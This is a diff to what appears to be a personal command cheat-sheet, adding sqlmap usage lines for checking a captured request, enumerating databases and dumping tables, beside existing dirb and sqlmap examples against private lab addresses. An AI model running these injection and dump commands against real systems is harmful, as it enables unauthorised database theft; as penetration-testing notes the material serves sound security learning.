@@ -1499,6 +1499,9 @@ iec --field 4-5 | numfmt --header --from-unit=1024 --to=iec --field 6-7 | column
 - dirb: web directory scanner
   - dirb http://192.168.1.2
 - sqlmap: auto sql injection + exploit tool
+  - check captured request: sqlmap -r req.txt
+  - enumerate db: sqlmap -r req.txt --dbs --batch
+  - dump all from table: sqlmap -r req -D users --dump-all --batch
   - e.g: sqlmap -u "http://192.168.1.18/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
   - dump all: sqlmap -u "http://192.168.3.5/results.php" --dbms=MySQL --dump-all --batch --data "search=test" 
 - aws: aws cli
